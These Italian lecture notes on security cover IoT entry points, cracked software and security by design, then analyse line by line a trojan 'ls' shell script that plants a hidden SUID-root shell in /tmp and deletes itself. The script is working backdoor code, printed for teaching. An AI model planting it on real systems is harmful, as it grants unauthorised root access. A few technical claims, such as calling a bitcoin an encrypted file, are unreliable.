# Lezione 2
---
Ogni dispositivo connesso (IoT, smartphone, server) agisce come un potenziale punto di ingresso (entry point) e quindi è violabile ed abusabile dall'esterno. La sicurezza di una rete è forte quanto il suo anello più debole:
- Movimento Laterale: Una volta violato un dispositivo minore (es. una lampadina smart), l'attaccante può navigare all'interno della rete locale per colpire obiettivi critici (PC, database).
- Abuso di Risorse: Un dispositivo compromesso non viene solo "spiato", ma spesso trasformato in uno "zombie" per attacchi DDoS o mining di criptovalute.

Ogni riga di codice è anche una minaccia per la nostra sicurezza. E' quindi importante dire che quando avviamo un app, anche scaricata da un Play Store, stiamo commettendo un atto di fede, sperando che la nostra macchina non venga attaccata. Scaricare un'app significa concedere permessi (camera, microfono, contatti) basandosi esclusivamente sulla reputazione del fornitore, non sulla certezza tecnica.

Il software crackato e le piattaforme gratuite sono "pezzi di codice" che dovremmo evitare, poiché sono tra i più pericolosi.
I software crackati contengono quasi sempre Trojan horse. Il "prezzo" del software gratuito è spesso il furto di dati o l'integrità del sistema.
Nelle piattaforme gratuite, vige la massima: "Se non paghi per il prodotto, il prodotto sei tu" (o i tuoi dati).

Anche i BitCoin, come valuta digitale e quindi non fisica, sono "pericolosi". Un BitCoin non è altro che un file crittografato. Un Bitcoin non è un oggetto, ma una voce in un registro distribuito (Blockchain). Se il file viene copiato più volte, vuol dire averne di più, per questo servono dei protocolli di sicurezza per le monete digitali.
Per evitare che un file digitale venga "copiato e incollato" (permettendo di spendere due volte la stessa moneta), la rete utilizza la Proof of Work.

Il Security Design (o Security by Design) è l'approccio per cui la sicurezza non è un "optional" aggiunto alla fine, ma la base su cui si costruisce un software o una rete.
È una filosofia di progettazione. Invece di correggere i buchi (vulnerabilità) dopo che il software è stato creato, si progetta il sistema affinché sia resistente per natura.
Se il software crackato è pericoloso perché contiene codice malevolo "nascosto", il Security Design è la pratica opposta: creare codice trasparente, verificabile e progettato per bloccare intrusioni anche se l'utente commette un errore.

Reti sicure: conoscere Wireshark. È un analizzatore di protocollo di rete (o packet sniffer). Immaginalo come un "microscopio" per i cavi di rete o il Wi-Fi. Mentre un voltmetro misura l'elettricità, Wireshark "annusa" e registra ogni singolo pacchetto di dati che entra o esce dal tuo dispositivo. 

------------------------------
🛡️ Internet Security: Analisi del Trojan Horse e Abuso del SUID
L'abuso dei permessi speciali nei sistemi Unix/Linux rappresenta uno dei vettori d'attacco più efficaci per l'escalation dei privilegi e la creazione di backdoor.
1. Il Contesto: Gestione dei Permessi in Unix/Linux
In un sistema Unix, la sicurezza è governata dal concetto di Proprietario (Owner) e di Permessi.

* Funzionamento Standard: Di norma, ogni processo viene eseguito con i privilegi dell'utente che lo lancia. Se l'utente Mario non può leggere un file riservato, nessun programma avviato da Mario potrà farlo.
* Il Paradosso del comando passwd: Alcune operazioni legittime richiedono privilegi superiori. Ad esempio, per cambiare la propria password, un utente deve scrivere nel file /etc/shadow, che è accessibile solo dall'utente root (amministratore).
* La Soluzione - Bit SUID: Il Set owner User ID (SUID) è un permesso speciale. Se applicato a un file eseguibile, il programma non girerà con i permessi di chi lo lancia, ma con quelli del proprietario del file. Nel caso di passwd, il proprietario è root, consentendo così l'operazione privilegiata in modo controllato.

2. La Vulnerabilità: Escalation dei Privilegi
Il SUID è un'arma a doppio taglio. Se un attaccante riesce a manipolare i permessi di un file per includere il bit SUID sotto la proprietà di root, viola il principio cardine del Security Design: il Privilegio Minimo.

* Rischio: Un programma apparentemente innocuo può trasformarsi in una "porta magica" che regala poteri di amministratore a utenti non autorizzati.


3. Case Study: Analisi Tecnica del Trojan "ls"
Immaginiamo che un attaccante riesca a sostituire il comando originale ls (usato per elencare i file) con il seguente script malevolo.
Il Codice del Trojan

```text cp /bin/sh /tmp/.xxsh
chmod u+s,o+x /tmp/.xxsh
rm ./ls
ls $*
```

Analisi Step-by-Step delle Istruzioni:

   Entriamo nel "cuore" tecnico dello script. Per capire come un semplice file di testo possa distruggere la sicurezza di un sistema Unix, dobbiamo analizzare ogni simbolo e ogni interazione con il kernel.
Ecco l'analisi tecnica profonda di ogni riga del Trojan:
1. cp /bin/sh /tmp/.xxsh

* L'obiettivo: Creare un "clone" dello strumento di comando più potente del sistema.
* Dettaglio Tecnico: /bin/sh (o spesso un link a bash) è l'interprete dei comandi. Copiandolo in /tmp, l'attaccante lo mette in una directory "world-writable", ovvero una cartella dove qualunque utente, anche il più limitato, ha il permesso di scrivere file.
* L'offuscamento: Il nome .xxsh usa il prefisso . (punto). Nei sistemi Unix, i file che iniziano con un punto sono file nascosti: il comando ls standard non li mostra, a meno che l'utente non scriva esplicitamente ls -a. Questo garantisce che la backdoor rimanga invisibile durante il normale utilizzo del PC.

2. chmod u+s,o+x /tmp/.xxsh
Questa è la riga dove avviene il "crimine" informatico contro il Security Design.

* u+s (Il Bit SUID): Questa è l'istruzione critica. Se lo script viene eseguito da un utente che ha privilegi elevati (o se l'attaccante riesce a far sì che il file appartenga a root), il bit SUID dice al sistema operativo: "Quando questo file viene eseguito, ignora l'identità di chi lo lancia e usa l'identità del proprietario del file".
* o+x (Permesso di Esecuzione): Rende il file eseguibile da "Others" (tutti gli altri utenti).
* Il Risultato: Si crea una Shell SUID-Root. Chiunque la esegua (anche un utente ospite) si ritroverà con un terminale che ha poteri di amministrazione totale sul sistema, senza che venga mai chiesta una password.

3. rm ./ls

* L'obiettivo: L'auto-eliminazione (Anti-Forensics).
* Dettaglio Tecnico: Lo script cancella se stesso (./ls). Questo serve a prevenire che un utente sospettoso faccia un cat ls (per leggere il contenuto del comando) o un file ls (per vedere che tipo di file è).
* La trappola: Una volta che lo script è in esecuzione, il codice è già caricato in memoria RAM, quindi può cancellare il file fisico sul disco senza interrompersi. Al termine dell'esecuzione, del Trojan non rimarrà traccia sul disco rigido nella cartella corrente.

4. ls $*

* L'obiettivo: Mantenere l'illusione della normalità (Social Engineering).
* Il simbolo ``` $*```:In linguaggio shell, questa variabile rappresenta tutti gli argomenti che l'utente ha digitato. Se l'utente ha scritto ls -l /home, allora $* vale -l /home.
* Dettaglio Tecnico: Lo script chiama il vero comando ls di sistema (solitamente situato in /bin/ls) passandogli gli stessi identici parametri.
* L'Inganno: La vittima vede esattamente quello che si aspettava di vedere. Non riceve messaggi d'errore come "Comando non trovato" o "Accesso negato". Questo garantisce che la backdoor rimanga attiva per settimane o mesi prima che qualcuno si accorga di nulla.

Perché questo attacco è perfetto?

   1. Privilegi: Sfrutta un meccanismo legittimo (SUID) per scopi malevoli (Privilege Escalation).
   2. Persistenza: Crea una porta sul retro che rimane nel sistema anche dopo il riavvio (Backdoor).
   3. Invisibilità: Si nasconde dietro un comando comune e si auto-elimina (Stealthiness).


4. Danno e Conseguenze: "L'Atto di Fede" Tradito
L'attacco non produce un danno visibile immediato, il che lo rende estremamente pericoloso.

* Impatto Immediato (Invisibile): Creazione di una Backdoor. L'attaccante ha ora una shell dormiente in /tmp/.xxsh.
* Impatto Differito: In qualsiasi momento, l'attaccante può eseguire quel file nascosto e ottenere istantaneamente i privilegi di root, bypassando ogni sistema di autenticazione.
* Rischio di Interconnessione: Una volta ottenuto il controllo totale (Root), l'attaccante può:
* Installare Keylogger o Sniffer (come Wireshark).
   * Usare il dispositivo come ponte per violare altri nodi della rete interconnessa.

💡 Sintesi 
Il Trojan Horse non è solo un "virus", è un inganno procedurale. Sfrutta la fiducia dell'utente verso i comandi di sistema e l'abuso di meccanismi necessari (come il SUID) per abbattere le barriere del Security Design.

Eseguire questo script equivale a creare una shell con i permessi della vittima.